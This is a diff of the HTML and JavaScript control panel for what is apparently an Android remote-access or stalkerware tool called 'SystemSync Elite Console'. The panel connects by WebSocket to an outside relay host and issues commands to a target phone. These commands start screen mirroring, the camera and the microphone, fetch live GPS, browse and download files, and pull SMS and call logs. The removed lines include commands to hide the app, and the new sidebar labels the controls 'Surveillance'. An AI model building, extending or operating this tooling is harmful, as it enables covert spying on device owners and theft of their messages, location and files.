@@ -1,17 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>SystemSync ELITE Console</title>
+<title>SystemSync Elite Console</title>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 
 <style>
 
-/* ===== GLOBAL ===== */
-
 body{
     margin:0;
-    font-family:'Segoe UI',sans-serif;
-    background:#f4f7fb;
+    background:#f4f6fb;
+    font-family:Segoe UI;
     display:flex;
     height:100vh;
 }
@@ -19,36 +17,44 @@ body{
 /* ===== SIDEBAR ===== */
 
 #sidebar{
-    width:280px;
+    width:270px;
     background:#ffffff;
-    border-right:1px solid #e1e6ef;
-    padding:20px;
+    border-right:1px solid #e2e6ef;
+    padding:18px;
     overflow-y:auto;
 }
 
 .logo{
     font-size:20px;
     font-weight:700;
-    color:#007aff;
-    margin-bottom:25px;
+    color:#1976ff;
+    margin-bottom:20px;
 }
 
-/* Buttons */
+.section-title{
+    font-size:11px;
+    color:#8892a7;
+    margin:18px 0 6px;
+    text-transform:uppercase;
+}
+
+/* ===== BUTTONS ===== */
 
 button{
     width:100%;
-    padding:11px;
-    margin:6px 0;
+    padding:10px;
     border-radius:8px;
-    border:none;
-    background:#eef3fb;
+    border:1px solid #dfe3ec;
+    background:#fff;
     cursor:pointer;
-    font-weight:600;
+    margin-bottom:6px;
+    text-align:left;
+    transition:.2s;
 }
 
 button:hover{
-    background:#007aff;
-    color:white;
+    background:#1976ff;
+    color:#fff;
 }
 
 /* ===== MAIN ===== */
@@ -59,77 +65,92 @@ button:hover{
     flex-direction:column;
 }
 
-/* HEADER */
-
 #header{
-    height:65px;
-    background:white;
-    border-bottom:1px solid #e1e6ef;
+    height:60px;
+    background:#fff;
+    border-bottom:1px solid #e2e6ef;
     display:flex;
     align-items:center;
     justify-content:space-between;
     padding:0 25px;
-}
-
-.status{
-    padding:6px 14px;
-    border-radius:20px;
-    background:#e6f7ec;
-    color:#0a8f3c;
     font-weight:600;
 }
 
-/* ===== SINGLE OUTPUT PANEL ===== */
+#status{
+    padding:6px 12px;
+    border-radius:20px;
+    background:#ffebee;
+    color:#d32f2f;
+}
+
+/* ===== SINGLE PANEL ===== */
 
 #panel{
     flex:1;
     margin:20px;
-    background:white;
-    border-radius:16px;
-    box-shadow:0 8px 30px rgba(0,0,0,.05);
-    overflow:hidden;
-    display:flex;
-    flex-direction:column;
+    background:#fff;
+    border-radius:14px;
+    box-shadow:0 8px 25px rgba(0,0,0,.05);
+    overflow:auto;
+    padding:20px;
 }
 
-/* VIDEO AREA */
+/* VIDEO */
 
-#videoArea{
-    height:320px;
-    background:#000;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-}
-
-video, img{
+video,img{
     width:100%;
-    height:100%;
+    max-height:75vh;
     object-fit:contain;
 }
 
-/* DATA AREA */
+/* TABLE */
 
-#dataArea{
-    flex:1;
-    overflow:auto;
-    padding:15px;
+table{
+    width:100%;
+    border-collapse:collapse;
 }
 
-/* FILE STYLE */
+th,td{
+    padding:10px;
+    border-bottom:1px solid #eef1f6;
+    font-size:14px;
+}
+
+th{
+    background:#f7f9fc;
+    text-align:left;
+}
+
+/* FILE GRID */
 
 .file{
     padding:10px;
-    border-bottom:1px solid #eee;
-    display:flex;
-    justify-content:space-between;
+    border-bottom:1px solid #eef1f6;
+    cursor:pointer;
 }
 
-/* Map */
+.file:hover{
+    background:#f1f5ff;
+}
 
-#map{
-    height:350px;
-    border-radius:10px;
+/* PAGINATION */
+
+.pagination{
+    margin-top:10px;
+    display:flex;
+    gap:6px;
+}
+
+.pageBtn{
+    padding:6px 10px;
+    border:1px solid #d0d7e2;
+    background:#fff;
+    cursor:pointer;
+}
+
+.pageBtn:hover{
+    background:#1976ff;
+    color:#fff;
 }
 
 </style>
@@ -141,26 +162,26 @@ video, img{
 
 <div id="sidebar">
 
-<div class="logo">SYSTEMSYNC</div>
+<div class="logo">SystemSync</div>
 
-<button onclick="startScreen()">🖥 Screen Mirror</button>
-<button onclick="stopScreen()">⏹ Stop Screen</button>
-<button onclick="send('camFront')">📹 Front Camera</button>
-<button onclick="send('camBack')">📹 Back Camera</button>
-<button onclick="send('getLocation')">📍 Live GPS</button>
+<div class="section-title">Surveillance</div>
+
+<button onclick="startScreen()">🖥 Start Screen</button>
+<button onclick="send('STOP_SCREEN_SHARE')">⏹ Stop Screen</button>
+
+<button onclick="send('camFront')">📷 Start Front Camera</button>
+<button onclick="send('stopCam')">⏹ Stop Camera</button>
+
 <button onclick="send('startAudio')">🎤 Start Mic</button>
 <button onclick="send('stopAudio')">⏹ Stop Mic</button>
 
-<hr>
+<button onclick="send('getLocation')">📍 GPS</button>
+
+<div class="section-title">Data</div>
 
 <button onclick="send('ls root')">📂 File Manager</button>
 <button onclick="send('getSMS inbox')">💬 SMS Logs</button>
 <button onclick="send('getCallLogs')">📞 Call Logs</button>
-
-<hr>
-
-<button onclick="send('hideApp')">👻 Hide App</button>
-<button onclick="send('showApp')">👁 Show App</button>
 
 </div>
 
@@ -169,169 +190,177 @@ video, img{
 <div id="main">
 
 <div id="header">
-<div><b>ELITE CONTROL</b></div>
-<div id="status" class="status">CONNECTING...</div>
+Elite Control Panel
+<div id="status">CONNECTING</div>
 </div>
-
-<!-- 🔥 ONE PANEL ONLY -->
 
 <div id="panel">
-
-<div id="videoArea">
-<div>No Media</div>
-</div>
-
-<div id="dataArea"></div>
-
+Ready.
 </div>
 
 </div>
-
-
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
 <script>
 
-const WS_URL="wss://mirror-view.onrender.com";
+const WS_URL = "wss://mirror-view.onrender.com";
 
 let ws;
 let pc;
-let mapInstance=null;
+let currentData=[];
+let currentPage=0;
 
-// CONNECT
+const panel = document.getElementById("panel");
+
+/* ==========================
+   CONNECT
+========================== */
+
 function connect(){
 
-ws=new WebSocket(WS_URL);
+ws = new WebSocket(WS_URL);
 
 ws.onopen=()=>{
-ws.send("I_AM_WEB");
-setStatus("ONLINE");
+    ws.send("I_AM_WEB");
+    setStatus("ONLINE");
 };
 
 ws.onclose=()=>{
-setStatus("OFFLINE");
-setTimeout(connect,4000);
+    setStatus("OFFLINE");
+    setTimeout(connect,4000);
 };
 
 ws.onmessage=(e)=>{
 
-const msg=e.data;
+const msg = e.data;
 
-if(msg.startsWith("LOC_DATA:")){
-renderMap(JSON.parse(msg.substring(9)));
-}
+if(msg.startsWith("SMS_DATA:"))
+    renderTable(JSON.parse(msg.substring(9)));
 
-else if(msg.startsWith("FILE_LIST:")){
-renderFiles(JSON.parse(msg.substring(10)));
-}
+else if(msg.startsWith("CALL_DATA:"))
+    renderTable(JSON.parse(msg.substring(10)));
 
-else if(msg.startsWith("SMS_DATA:")){
-renderRaw(JSON.parse(msg.substring(9)));
-}
+else if(msg.startsWith("FILE_LIST:"))
+    renderFiles(JSON.parse(msg.substring(10)));
 
-else if(msg.startsWith("CALL_DATA:")){
-renderRaw(JSON.parse(msg.substring(10)));
-}
+else if(msg.startsWith("CAMERA_IMAGE:"))
+    showImage(msg.substring(13));
 
-else if(msg.startsWith("CAMERA_IMAGE:")){
-showImage(msg.substring(13));
-}
-
-else if(msg.startsWith("RTC_OFFER:screen:")){
-handleOffer(msg.substring(17));
-}
-
-else if(msg.startsWith("ICE_CANDIDATE:")){
-handleIce(msg.substring(14));
-}
+else if(msg.startsWith("RTC_OFFER:screen:"))
+    handleOffer(msg.substring(17));
 
 };
 
 }
 
-function setStatus(t){
-document.getElementById("status").innerText=t;
+function setStatus(s){
+const el=document.getElementById("status");
+
+el.innerText=s;
+el.style.background = s==="ONLINE" ? "#e8f5e9" : "#ffebee";
 }
 
-// COMMAND
+/* ==========================
+   COMMAND
+========================== */
+
 function send(cmd){
-if(ws.readyState===1) ws.send(cmd);
+if(ws.readyState===1)
+    ws.send(cmd);
 }
 
-// ---------- VIDEO ----------
+/* ==========================
+   SINGLE PANEL RENDERERS
+========================== */
 
-function showImage(b64){
-document.getElementById("videoArea").innerHTML=
-`<img src="data:image/jpeg;base64,${b64}">`;
-}
+function showImage(base64){
 
-// ---------- MAP ----------
-
-function renderMap(data){
-
-document.getElementById("dataArea").innerHTML=`<div id="map"></div>`;
-
-if(mapInstance) mapInstance.remove();
-
-setTimeout(()=>{
-
-mapInstance=L.map('map').setView([data.lat,data.lon],18);
-
-L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png')
-.addTo(mapInstance);
-
-L.marker([data.lat,data.lon]).addTo(mapInstance);
-
-},200);
+panel.innerHTML=
+`<img src="data:image/jpeg;base64,${base64}">`;
 
 }
 
-// ---------- FILES ----------
+/* TABLE WITH PAGINATION */
+
+function renderTable(data){
+
+currentData=data;
+currentPage=0;
+
+drawTable();
+
+}
+
+function drawTable(){
+
+const start=currentPage*20;
+const rows=currentData.slice(start,start+20);
+
+let html="<table><tr>";
+
+Object.keys(rows[0]).forEach(k=>{
+html+=`<th>${k}</th>`;
+});
+
+html+="</tr>";
+
+rows.forEach(r=>{
+html+="<tr>";
+Object.values(r).forEach(v=>{
+html+=`<td>${v}</td>`;
+});
+html+="</tr>";
+});
+
+html+="</table>";
+
+/* pagination */
+
+html+=`<div class="pagination">`;
+
+for(let i=0;i<Math.ceil(currentData.length/20);i++){
+html+=`<button class="pageBtn" onclick="gotoPage(${i})">${i+1}</button>`;
+}
+
+html+="</div>";
+
+panel.innerHTML=html;
+
+}
+
+function gotoPage(p){
+currentPage=p;
+drawTable();
+}
+
+/* FILE EXPLORER */
 
 function renderFiles(files){
 
-let html="";
+let html="<h3>File Explorer</h3>";
 
 files.forEach(f=>{
 
 html+=`
-<div class="file">
-<div>${f.isDir?'📁':'📄'} ${f.name}</div>
-<button onclick="send('${f.isDir?'ls ':'dl '}${f.path}')">
-${f.isDir?'OPEN':'DL'}
-</button>
+<div class="file"
+onclick="send('${f.isDir?'ls ':'dl '}${f.path}')">
+${f.isDir?'📁':'📄'} ${f.name}
 </div>`;
+
 });
 
-document.getElementById("dataArea").innerHTML=html;
+panel.innerHTML=html;
 
 }
 
-// RAW JSON DISPLAY (SMS / CALL)
+/* ==========================
+   WEBRTC
+========================== */
 
-function renderRaw(data){
+async function startScreen(){
 
-document.getElementById("dataArea").innerHTML=
-`<pre>${JSON.stringify(data,null,2)}</pre>`;
+panel.innerHTML="<h2>Waiting for screen...</h2>";
 
-}
-
-// ---------- SCREEN SHARE ----------
-
-function startScreen(){
-send('START_SCREEN_SHARE');
-}
-
-function stopScreen(){
-
-send('STOP_SCREEN_SHARE');
-
-if(pc){
-pc.close();
-pc=null;
-}
-
-document.getElementById("videoArea").innerHTML="No Media";
+send("START_SCREEN_SHARE");
 
 }
 
@@ -340,41 +369,38 @@ function handleOffer(sdp){
 if(!pc){
 
 pc=new RTCPeerConnection({
-iceServers:[{urls:'stun:stun.l.google.com:19302'}]
+iceServers:[{urls:"stun:stun.l.google.com:19302"}]
 });
 
 pc.ontrack=(e)=>{
-document.getElementById("videoArea").innerHTML=
-'<video id="remoteVideo" autoplay playsinline></video>';
+panel.innerHTML=
+'<video autoplay playsinline id="v"></video>';
 
-document.getElementById("remoteVideo").srcObject=e.streams[0];
+document.getElementById("v")
+.srcObject=e.streams[0];
 };
 
 pc.onicecandidate=(e)=>{
-if(e.candidate){
-ws.send('ICE_CANDIDATE:'+JSON.stringify(e.candidate));
-}
+if(e.candidate)
+ws.send("ICE_CANDIDATE:"+JSON.stringify(e.candidate));
 };
 
 }
 
-pc.setRemoteDescription(
-new RTCSessionDescription({type:'offer',sdp})
-)
+pc.setRemoteDescription({
+type:'offer',
+sdp:sdp
+})
 .then(()=>pc.createAnswer())
 .then(a=>pc.setLocalDescription(a))
 .then(()=>{
-ws.send('ANSWER:'+pc.localDescription.sdp);
+ws.send("ANSWER:"+pc.localDescription.sdp);
 });
 
 }
 
-function handleIce(c){
-if(!pc) return;
-pc.addIceCandidate(new RTCIceCandidate(JSON.parse(c)));
-}
+/* ========================== */
 
-// INIT
 connect();
 
 </script>
